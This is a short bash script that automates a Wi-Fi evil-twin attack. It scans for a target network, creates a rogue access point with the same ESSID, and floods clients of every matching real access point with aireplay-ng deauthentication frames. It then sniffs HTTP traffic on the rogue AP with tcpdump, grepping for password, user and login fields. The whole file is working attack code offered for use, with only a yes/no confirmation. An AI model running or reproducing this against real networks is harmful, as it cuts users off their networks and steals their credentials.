#!/bin/bash
echo "Enter interface for monitoring/injection"
read interface_deauth
echo "Enter interface for rogue AP"
read interface_ap
echo "Enter faceing interface"
read interface_faceing
echo "Enter WiFi type 1: Open, 2: WPA/WPA2 PSK"
read wifitype

if [ $wifitype = 2 ]
then
	echo "Please enter the passphrase"
	read -s passphrase	
	
fi
echo "Setting up interfaces, this might take while"

ifconfig ${interface_deauth} down
iwconfig ${interface_deauth} mode managed
ifconfig ${interface_deauth} up
sleep 5s
ifconfig ${interface_ap} down
iwconfig ${interface_ap} mode managed
ifconfig ${interface_ap} up
sleep 5s


#shows a list of the neighbooring AP's
iwlist ${interface_deauth} scan | grep "ESSID"

echo "Enter the ESSID of the target AP"
read essid

#stores in an array information about AP's with the given ESSID (MAC Address, channel, ESSID) 
array=( $(sudo iwlist ${interface_deauth} scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )

#variable used keep track of the index of the array
count=0

echo "Do you really want to attack ${essid} Yes/No ?"
read response

if [ $response = Yes ]
then
	echo "Attack launched"
	if [ $wifitype = 1 ]
	then
		#a rogue AP with the target ESSID is created
		xterm -hold -e create_ap ${interface_ap} ${interface_faceing} "${essid}" &
		sleep 5s
		echo " Wireless Network ${essid} created"
		
	fi

	if [ $wifitype = 2 ]
	then
		xterm -hold -e create_ap ${interface_ap} ${interface_faceing} "${essid}" ${passphrase} &
		sleep 5s
		echo "Wireless Network ${essid} created"
		
	fi


	#puts the deauthing interface into monitor mode, necessary for injecting dauthentication frames
	ifconfig ${interface_deauth} down
        iwconfig ${interface_deauth} mode monitor
	ifconfig ${interface_deauth} up

	#a deauthentication attack is launched against every AP with the target ESSID
	for i in "${array[@]}"
	do
		#these magic constants (%8, -eq 4) are designed to extract the required information from the grep output
		if [ $(($count%8)) -eq 4 ]
		then
			#stores the target AP's MAC address
			address=$i
		fi
		if [ $(($count%8)) -eq 5 ]
		then
			#stores the target AP0s channel
			channel="${i//[!0-9]/}"

			#switches the channel of the deauthing interface to the target AP's channel
			iwconfig ${interface_deauth} channel ${channel}

			#deauthenticate users connected to the target AP
			(xterm -hold -e aireplay-ng -0 15 -a ${address} ${interface_deauth} &) 
		fi
		((++count))
	done
fi

xterm -hold -e "tcpdump -i ${interface_ap} port http -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20" &




